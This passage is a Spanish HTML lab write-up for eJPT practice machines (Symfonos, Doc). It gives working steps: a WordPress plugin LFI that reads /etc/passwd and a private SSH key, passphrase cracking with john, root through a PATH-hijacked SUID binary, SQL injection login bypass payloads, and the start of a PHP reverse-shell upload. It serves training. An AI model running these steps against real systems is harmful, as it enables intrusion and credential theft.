+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/smbclient_helios_mget_files_symfonos.png"
+                      alt="Obtener todos los archivos."
+                ><figcaption>Obtener todos los archivos.</figcaption></figure></p>
+<p>El archivo todo.txt nos cuenta que hay trabajo en el directorio “&#x2F;h3l105&#x2F;“, esto parece una ruta del navegador, pero al acceder vemos un wordpress, pero se ve un poco meh.</p>
+<p><figure class="image-caption"><img src="/2025/03/25/lab-ejptv2-xerosec/wordpress_first_view_symfonos.png" alt="Primer vistazo de /h3l105&quot;"><figcaption>Primer vistazo de /h3l105&quot;</figcaption></figure></p>
+<p>No alarmarse, esto es porque los archivos a los que esta intentando llamar este wordpress no los encuentra el navegador. Si hacéis un ctrl+u para ver el código fuente podéis ver que los enlaces apuntes a <strong>symfonos.local</strong> y claro, nosotros estamos apuntado a la IP. Este concepto se conoce como <strong>virtual hosting</strong>, para solucionarlo tenemos que dirigirnos a nuestro archivo <strong>&#x2F;etc&#x2F;hosts</strong>(para la resolución de dominios con la ip) y añadir la siguiene línea:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.2.6        symfonos.local</span><br></pre></td></tr></table></figure></div>
+
+<p>Con esto nos encargamos de relacionar la IP indicada al dominio symfonos.local(el que nos aparecía en el código fuente).</p>
+<p>Ahora si intentáis acceder desde el navegador con el nombre symfonos.local&#x2F;h3l105 podéis ver la diferencia en la página web:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/wordpress_correct_view_symfonos.png"
+                      alt="Visualización correcta de h3l105."
+                ><figcaption>Visualización correcta de h3l105.</figcaption></figure></p>
+<h3 id="Wordpress-en-h3l105"><a href="#Wordpress-en-h3l105" class="headerlink" title="Wordpress en h3l105"></a>Wordpress en h3l105</h3><p>Nada mas abrir el wordpress, vemos que el post de Hello world es creado por el usuario <strong>admin</strong>, entonces ya tenemos un usuario.</p>
+<p>Si nosotros nos dirigimos a la ruta <strong>&#x2F;wp-admin</strong> podemos comprobar si el usuario es válido poniendo su nombre como usuario, según la respuesta, veremos si el usuario es válido o no.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/wordpress_admin_wp-login_symfonos.png"
+                      alt="Usuario admin."
+                ><figcaption>Usuario admin.</figcaption></figure></p>
+<p>Podemos ver que el mensaje nos dice que la contraseña para dicho usuario es inválida, en cambio, si os inventáis un usuario veréis que el mensaje cambia(Dice usuario inválido).</p>
+<h4 id="Uso-de-WPScan"><a href="#Uso-de-WPScan" class="headerlink" title="Uso de WPScan"></a>Uso de WPScan</h4><p>En este caso al ser un wordpress vamos a utilizar la herramienta WPScan, si fuera un Joomla tendríamos que utilizar <a class="link"   target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan" >joomscan<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> y si fuera un Droopal pues <a class="link"   target="_blank" rel="noopener" href="https://github.com/SamJoan/droopescan" >droopescan<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. En caso de no estar estas herramientas utilizar las disponibles en el laboratorio que sigan el mismo propósito.</p>
+<p>WPScan puedes añadirle una clave API para que te descubra vulnerabilidades aunque no sería neceseario en un principio para el examen ni este laboratorio.<br>Para hacer un escaneo vamos a utilizar el siguiente comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan -U admin -P /usr/share/wordlists/rockyou.txt --url http://symfonos.local/h3l105/</span><br></pre></td></tr></table></figure></div>
+
+<p>En este caso no va a encontrar nada, así que podemos cancelar esto. Aunque en el eJPT es muy probable que muchos problemas se resuelvan haciendo fuerza bruta en los diferentes servicios.</p>
+<p>Vamos a realizar un escaneo normal del wordpress:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://symfonos.local/h3l105/</span><br></pre></td></tr></table></figure></div>
+
+<p>Lo interesante aquí es que nos indica los plugins y sus versiones entre otras cosas.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/wordpress_wpscan_plugins_symfonos.png"
+                      alt="Plugins del wordpress detectados con WPScan."
+                ><figcaption>Plugins del wordpress detectados con WPScan.</figcaption></figure></p>
+<h2 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h2><p>Como no hemos introducido la API key no nos muestra si existen vulnerabilidades, entonces, vamos a utilizar <strong>searchsploit</strong> para buscar vulnerabilidades correspondientes a las versiones de dichos plugins. Dicha herramienta utiliza una base de datos creada a partir de la información existente en <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/" >exploit-db<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/wordpress_searchsploit_mailmasta_plugin_symfonos.png"
+                      alt="Resultados de searchsploit"
+                ><figcaption>Resultados de searchsploit</figcaption></figure></p>
+<p>Es recomendable no utilizar el “-“ ya que muchas veces da problemas y puede reportar falsos positivos.</p>
+<p>Una vez aquí vemos tres exploits, dos LFI(Local File Inclusion) y una SQL Injection.</p>
+<p>Si queremos solo inspeccionar el exploit sin descargárnolo sería de la siguiente manera:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x 40290</span><br></pre></td></tr></table></figure></div>
+
+<p>Esta es una de las formas, también puedes poner el path entero en lugar de solo el identificador.</p>
+<p>Para descargartelo se usaría el parámetro <code>-m</code>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 40290</span><br></pre></td></tr></table></figure></div>
+
+<p>En el archivo de texto, podemos encontrar entre todos los posibles archivos vulnerables, una prueba de concepto para comprobar el funcionamiento de dicha vulnerabilidad:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/wordpress_plugin_mailmasta_exploit_lfi_poc_symfonos.png"
+                      alt="PoC(Proof-of-Concept). de Mail Masta."
+                ><figcaption>PoC(Proof-of-Concept). de Mail Masta.</figcaption></figure></p>
+<p>También podéis buscar vulnerabilidades del otro plugin, <code>searchsploit wordpress site editor</code> y saldría un LFI y un CSRF(Cross-Site Request Forguery).</p>
+<p>Si probamos nosotros a seguir esta ruta podemos comprobar que funciona:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>Con el archivo &#x2F;etc&#x2F;passwd podemos ver que usuarios tienen una shell asociada(permisos de utilizar una shell), esto nos interesa para ver con que usuario podemos entrar al sistema.</p>
+<p><figure class="image-caption"><img src="/2025/03/25/lab-ejptv2-xerosec/wordpress_etc_passwords_shell_symfonos.png" alt="Usuarios con una shell en el archivo /etc/password."><figcaption>Usuarios con una shell en el archivo /etc/password.</figcaption></figure></p>
+<p>Lo siguiente a pensar sería, como podemos pasar de un LFI a un RCE(Remote Command Execution). Siempre en el ejpt tenemos que buscar la manera más fácil de cómo se realizaría algo, en este caso, podemos seguir mirando rutas en el sistema y una ruta potencial es <strong>donde se almacena la id_rsa del usuario helios por defecto</strong>. Otra forma muy común es Apache Log Poisoning, pero está máquina no va por aquí(Originalmente va por smtp log poisoning, pero recuerda que lo modificamos porque es más difícil que el laboratorio). También puedes encontrar la contraseña en otras rutas o servicios de la máquina como smb.</p>
+<p>Si podemos obtener esta id_rsa para conectarnos por ssh ya tendremos ejecucción de comandos.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/helios/.ssh/id_rsa</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/wordpress_lfi_id_rsa_symfonos.png"
+                      alt="id_rsa del usuario helios."
+                ><figcaption>id_rsa del usuario helios.</figcaption></figure></p>
+<p>Esta clave nos la guardamos en un fichero. Ya podemos comprobar a simple vista que la clave está cifrada, esto significa que nos pedirá una contraseña más adelante para poder acceder con dicha clave. </p>
+<p>Si intentamos acceder por ssh normal <code>helios@10.0.2.6</code> podéis ver que no os deja, esto omite la posibilidad de hacer fuerza bruta hacia dicho servicio. La única manera de hacerla es con clave privada obtenida. Nosotros hemos obtenido la clave privada(id_rsa), la clave pública(id_rsa.pub) se encarga de verificar la conexión con la clave privada correspondiente. La pública la podemos compartir sin problema, en cambio, con la privada podemos acceder como dicho usuario.</p>
+<p>El fichero(en mi caso llamado id_rsa) donde almacenamos la clave tiene que tener permisos de lectura y escritura solo por parte del propietario:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br></pre></td></tr></table></figure></div>
+
+<p>En caso de no realizar lo siguiente la clave no funcionará. Ahora vamos a utilizarla:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa helios@10.0.2.6</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/attempt_access_ssh_id_rsa_symfonos.png"
+                      alt="Intento fallido de acceso por falta de contraseña."
+                ><figcaption>Intento fallido de acceso por falta de contraseña.</figcaption></figure></p>
+<h3 id="ssh2john"><a href="#ssh2john" class="headerlink" title="ssh2john"></a>ssh2john</h3><p>Como no tenemos la “passphrase”(contraseña) no podemos iniciar con el usuario helios. Para ello tenemos vamos a romper la clave cifrada con <strong>John The Ripper</strong>. Este concepto de romper se trata en comparar hashes con una contraseña asociada al hash de la id_rsa. En caso de ser iguales, devolverá la contraseña asociada. Tenéis otras herramientas como <strong>hashcat</strong> aunque no va la utilizaremos.</p>
+<p>Para utilizar ssh2john tenemos que convertir el formato de la clave id_rsa a un formato válido(un hash especial) para que john pueda romper, averiguar, comparar los hashes.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; hash.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>Para crackearlo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>Podemos apreciar que John no ha tardado nada en encontrar la contraseña, en este caso es <strong>123123</strong>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/id_rsa_cracked_john_symfonos.png"
+                      alt="Contraseña crackeada."
+                ><figcaption>Contraseña crackeada.</figcaption></figure></p>
+<p>Si probamos a conectarnos por ssh ahora y introducir dicha contraseña.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/conexion_exitosa_con_helios_ssh_symfonos.png"
+                      alt="Conexión exitosa con el usuario helios a través de ssh."
+                ><figcaption>Conexión exitosa con el usuario helios a través de ssh.</figcaption></figure></p>
+<p>Dejo por aquí anotado el tener en cuenta la <strong>reutilización de contraseñas</strong> que muchas veces es algo que se pasa encima, pero en ciertas ocasiones se puede dar y nos puede facilitar el trabajo.</p>
+<h2 id="Escalada-de-privilegios"><a href="#Escalada-de-privilegios" class="headerlink" title="Escalada de privilegios"></a>Escalada de privilegios</h2><p>A continuación vamos a realizar una enumeración básica hasta que encontremos alguna manera de convertirnos al usuario root.</p>
+<p>Vamos a mostrar una lista de comandos que el usuario puede ejecutar como el usuario root:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure></div>
+<p>(Command not found)</p>
+<p>Ver o listar tareas que se ejecutan en un intervalo regular de tiempo. El crontab.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure></div>
+
+<p>No hay nada, lo que aparece son aplicaciones del sistema por defecto.</p>
+<p>Buscar archivos con permisos SUID. Esto significa que cada vez que ejecutemos dichos binarios se ejecuta con los permisos del propietario, en muchos caso root:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">ls</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/statuscheck_privilage_escalation_symfonos.png"
+                      alt="Archivos con permisos SUID."
+                ><figcaption>Archivos con permisos SUID.</figcaption></figure></p>
+<p>Podemos observar que el archivo &#x2F;opt&#x2F;statuscheck no es común. Esto se va viendo bajo la experiencia ya que cuando ves muchos resultados ves los archivos que te suenan y cuáles no.</p>
+<p>Vamos a ejecutar el archivo:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/statuscheck_execution_symfonos.png"
+                      alt="Ejecucción del binario."
+                ><figcaption>Ejecucción del binario.</figcaption></figure></p>
+<p>Mmm, este output me resulta familiar…<br>Si vemos de que tipo de archivo se trata con <code>file</code> veremos que que es un binario, LSB 64-bits para Linux.</p>
+<p>Que más podemos hacer, podemos intentar ver si con el comando&#x2F;herramienta <code>strings</code> vemos algo útil.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/statuscheck_strings_symfonos.png"
+                      alt="Strings sobre statuscheck."
+                ><figcaption>Strings sobre statuscheck.</figcaption></figure></p>
+<p>Listando las cadenas legibles del binario encontramos que se utiliza el comando <code>curl -I H</code> y vemos que no se utiliza una ruta absoluta &#x2F;usr&#x2F;bin&#x2F;curl. Nos vamos a aprovechar de este gran fallo en este fichero que ejecuta comandos el usuario root.</p>
+<p>Si vemos el path del sistema. Veremos el orden que utiliza el sistema para encontrar comandos una vez ejecutados. Al principio lo busca en &#x2F;usr&#x2F;local&#x2F;bin, si no lo encuentra ahí en &#x2F;usr&#x2F;bin, si no en &#x2F;bin y así…</p>
+<p>1<figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/path_symfonos.png"
+                      alt="PATH de symfonos."
+                ><figcaption>PATH de symfonos.</figcaption></figure></p>
+<p>Pues la idea es modificar el path para que empieze a mirar por donde nosotros querramos y que en dicha ruta exista un comando(archivo de ejecucción) llamado curl y este comando hará lo que nosotros querramos.</p>
+<p>Bien, para hacer todo esto vamos a modificar la variable PATH solo para esta sesión:</p>
+<p>Indicamos que queremos que el PATH empiece en la ruta &#x2F;tmp y después continue con el resto del path existente(almacenado en la variable $PATH)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/modify_path_symfonos.png"
+                      alt="Modificamos el path"
+                ><figcaption>Modificamos el path</figcaption></figure></p>
+<p>En la ruta &#x2F;tmp se borraran los archivos cuando la sesión acabe, igual que la modificación realizada en la variable PATH.</p>
+<p>Ahora nos dirigimos al directorio &#x2F;tmp y <strong>creamos un archivo con permisos de ejecucción llamado curl</strong>. Dentro de dicho archivo ponemos lo siguiente para que nos de una bash interactiva. Claro, recordar que esto lo ejecuta el usuario root, la bash es de root:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure></div>
+
+<p>La flag <code>-p</code> nos permite conservar los privilegios del usuario que ejecuto el comando. Si no nos dará una shell como el usuario helios. Si probáis cualquier otra manera puede que no os deje ya que estamos utilizando el permiso SUID y os de una shell del usuario helios. En cambio, con -p podrás mantener esos privilegios.</p>
+<p>Ahora si ejecutamos el binario &#x2F;opt&#x2F;statuscheck veremos que accedemos como el usuario root.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/root_symfonos.png"
+                      alt="Obtención del usuario root."
+                ><figcaption>Obtención del usuario root.</figcaption></figure></p>
+<h1 id="🎯-Doc"><a href="#🎯-Doc" class="headerlink" title="🎯 Doc"></a>🎯 Doc</h1><p>Resumen de lo que vamos a hacer(atención spoiler):<br>Vamos a utilizar Nikto para un escaneo de vulnerabilidades, vamos a hacer SQLi con sqlmap, file upload, enumeración de credenciales locales una vez comprometida para escalar privilegios.</p>
+<h2 id="Enumeracion-1"><a href="#Enumeracion-1" class="headerlink" title="Enumeración"></a>Enumeración</h2><p>Vamos a ver el reporte de servicios y versiones generado anteriormente y en mi caso la máquina Doc tiene la IP 10.0.2.10(Cuando arrancas la máquina lo ves).</p>
+<h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><p>Aquí encontramos el puerto 80 abierto con un nginx 1.18.0.</p>
+<p>Podemos realizar un whatweb para ver algo más de información:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://10.0.2.10</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/whatweb_doc.png"
+                      alt="Resultado de whatweb."
+                ><figcaption>Resultado de whatweb.</figcaption></figure></p>
+<p>Lo siguiente es abrir el navegador. Una vez accedemos, vemos que tenemos el mismo problema que la máquina anterior(virtual hosting), que los recursos no se cargan bien. En este caso ya sabemos como funciona, inspeccionamos el código fuente, encontramos que los recursos apuntan a doc.hmv y lo introducimos al fichero &#x2F;etc&#x2F;hosts.</p>
+<p>Vamos a utilizar Nikto para realizar un escaneo de vulnerabilidades en la web:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -url http://doc.hmv</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/nikto_scan_doc.png"
+                      alt="Resultados del escaneo con nikto."
+                ><figcaption>Resultados del escaneo con nikto.</figcaption></figure></p>
+<p>Es recomendable utilizarlo más o menos cuando realizamos el fuzzing de directorios con dirb&#x2F;dirbuster. Cuando no encuentras nada lo podemos utilizar como comodín(al igual que dirb&#x2F;dirbuster).</p>
+<p>En la captura hemos visto varias rutas llamativas como &#x2F;config.php &#x2F;admin&#x2F;login.php, &#x2F;.htaccess.</p>
+<p>Si abrimos las tres no encontramos nada. En config.php si se podría intentar por medio de un LFI y unos wrapper de php intentar ver su contenido, pero no es el fin de está máquina ni el objetivo del examen.</p>
+<h2 id="Explotacion-1"><a href="#Explotacion-1" class="headerlink" title="Explotación"></a>Explotación</h2><p>Así que nos dirigimos al panel de login y podemos empezar con un clásico, combinatorias como admin:admin, user:user, guest:guest, admin:admin pero no funcionan.</p>
+<p>Podríamos hacer ataques de fuerza bruta con Hydra(método PostForm), pero no es la finalidad de esta máquina.</p>
+<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>Podemos checkear si existe una posible SQLi, algunas querys básicas para probar serían las siguientes:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">password</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;-- -</span><br><span class="line">password</span><br></pre></td></tr></table></figure></div>
+
+<p>No cambia nada…<br>Si ojeamos el código fuente podemos ver diferentes rutas como una “uploads”… nos puede servir más adelante. También tenemos comentado un “forgot-password.html”, pero no funciona en ningún sitio.</p>
+<p>Pero y si probamos la típica inyección:</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1-- -</span></span><br><span class="line"><span class="string">password</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/admin_panel_doc.png"
+                      alt="Panel de administración."
+                ><figcaption>Panel de administración.</figcaption></figure></p>
+<p>¿Porque ha funcionado esta query?</p>
+<p>Bien, imaginemos la query que se esta utilizando por detrás para verificar el usuario en este caso, ojo, puede ser inyectable en los dos campos o en ninguno, lo recomendable es probar en los dos.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;sergiky&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>Lo que nosotros podemos controlar se añade en el campo username y password. En caso de que todo esto sea verdad(que el nombre sergiky exista y tenga la password password, pues entrará)</p>
+<p>Y si todo esto no esta bien sanitizado podemos introducir caracteres no deseados:</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;sergiky&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;<span class="comment">-- -&#x27; AND password = &#x27;password&#x27;;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Lo que hace este código básico es escaparse del campo del usuario añadiendo una comilla(‘) extra e indicando lo siguiente <code>OR 1=1;-- -</code>. Lo que significa que le añadiremos un operador lógico OR. Ahora en lugar de decir si el usuario y la contraseña esta bien que pase, sería, si el usuario o la siguiente condición y la contraseña esta bien que continue, pero con la diferencia que añadimos <code>--</code> que es la forma de comentar que tiene sql, así que el resto de la consulta no la vería.</p>
+<p>Entonces nos queda algo así:<br>Selecciona todos los usuarios de la tabla users y si existe ‘sergiky’ <strong>O</strong> 1&#x3D;1 es correcto que se logue.</p>
+<p>Al indicar este <strong>O</strong> ya nos da igual que el usuario exista o no, ya que la segunda condición se va a cumplir y como una de las dos se ha cumplido(porque es OR) pues la da por buena.<br>El punto y coma(;) se encarga de cerrar la consulta, ya que comentamos el resto. Aunque sin el punto y coma también podríamos ejecutarla, ya que al comentar la consulta esta se ejecuta automáticamente.</p>
+<p>Y la pregunta del millón, ¿porque entramos como administrador y no como otro usuario?<br>Porque el <code>OR 1=1;-- -</code> se recorre la tabla de arriba abajo y utiliza el primer usuario que se crea en la tabla(primera fila), normalmente suele ser administrador.</p>
+<p>Y si fuera algo más difícil?. Bien, pues podríamos utilizar burpsuite y foxyproxy para interceptar la data que se tramita al enviar la petición, guardamos dicha información en un archivo y utilizamos sqlmap para automatizar el ataque.</p>
+<p>Debemos de crear un proxy en foxyproxy(es un addon instalable) para poder utilizar el navegador con Burpsuite y que intercepte las peticiones. La configuración sería la siguiente:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/foxyproxy_conf_burp_doc.png"
+                      alt="Configuración proxy por defecto de Burpsuite en Foxyproxy."
+                ><figcaption>Configuración proxy por defecto de Burpsuite en Foxyproxy.</figcaption></figure></p>
+<p>Una vez creada la tenemos que activar.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/foxyproxy_burp_activate_doc.png"
+                      alt="Activamos foxyproxy."
+                ><figcaption>Activamos foxyproxy.</figcaption></figure></p>
+<p>Si abrimos Burpsuite y nos vamos a Proxy &gt; HTTPhistory podemos ver todas las peticiones que pasan por nuestro proxy del navegador.</p>
+<p>Si no habéis realizado nada no tendréis nada obviamente, en cambio, si introducis un usuario y una contraseña cualquiera y le dais a enviar podréis ver la petición.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/http_history_and_request_login_burp_doc.png"
+                      alt="Historial http y nuestra petición emitida."
+                ><figcaption>Historial http y nuestra petición emitida.</figcaption></figure></p>
+<p>A mi me salen más, pero porque recargue la página antes. El siguiente paso es guardarlo en un archivo, para ello le damos click derecho en el cuerpo de la solicitud y la opción <strong>Copy to file</strong>.</p>
+<p>En mi caso lance el burpsuite sin root sin querer y no podía guardarlo en root, así que lo guarde en un directorio cualquiera, después me convertí en root, lo moví y le cambie el propietario y grupo con <code>chown -R root:root request</code>.</p>
+<p>El contenido del archivo es lo mismo que veiamos por Burpsuite.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/request_file_saved_content_doc.png"
+                      alt="Contenido del archivo."
+                ><figcaption>Contenido del archivo.</figcaption></figure></p>
+<p>Ya podemos pasarle la request a sqlmap:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request</span><br></pre></td></tr></table></figure></div>
+
+<p>Cuando lo ejecutemos nos hará diferentes preguntas para adecuarse lo máximo posible al objetivo.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/sqlmap_results_doc.png"
+                      alt="Preguntas y resultados de sqlmap."
+                ><figcaption>Preguntas y resultados de sqlmap.</figcaption></figure></p>
+<p>Aunque nos da una inyección mucho más difícil de lo visto anteriormente, nos da una time-based blind, esto se queda totalmente fuera del “scope” del ejpt y además si la probamos no funciona :o.</p>
+<p>Normalemente SQLmap es más útil cuando queremos extraer información de una base de datos de una forma automatizada y sencilla.</p>
+<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>Bueno si continuamos y nos metemos dentro, vemos abajo a la derecha lo que parece ser un posible CMS y su versión, pues podríamos buscar el cms y la versión en searchsploit o en internet para ver si tiene algún exploit o vulnerabilidad conocida.</p>
+<p>Pero en este caso después de buscar en el CMS vemos en el perfil del usuario (My account) que tenemos un campo para subir un avatar(una imagen). Si le damos click derecho a la imagen del avatar y abrimos la ruta podremos ver donde se guardan los archivos, en este caso en <code>http://doc.hmv/uploads/1624240500_avatar.png</code>.</p>
+<p>A partir de aquí podemos probar muchas cosas, pero llendo un poco al grano, vamos a subir una reverse shell en php en lugar de una imagen. Podemos utilizar la reverse shell de pentestet monkey en la web <a class="link"   target="_blank" rel="noopener" href="https://www.revshells.com/" >revshells<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
